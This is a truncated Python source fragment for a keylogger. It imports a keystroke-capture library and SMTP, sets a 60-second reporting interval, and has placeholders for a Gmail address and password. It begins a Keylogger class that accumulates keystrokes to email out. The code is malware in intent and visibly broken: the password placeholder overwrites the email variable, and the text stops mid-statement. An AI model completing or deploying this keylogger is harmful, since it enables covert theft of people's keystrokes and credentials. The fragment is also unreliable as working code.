import keyboard
# keyboard records the keystrokes
import smtplib
# uses SMTP to send email
from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY = 60
EMAIL_ADDRESS = "YOURGMAIL.COMHERE"
EMAIL_ADDRESS = "YOURTOTALLYSECUREPASSWORDHERE"

class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        # Maintains log of all keystrokes in the given interval
        self.log = ""
        self.start.dt =
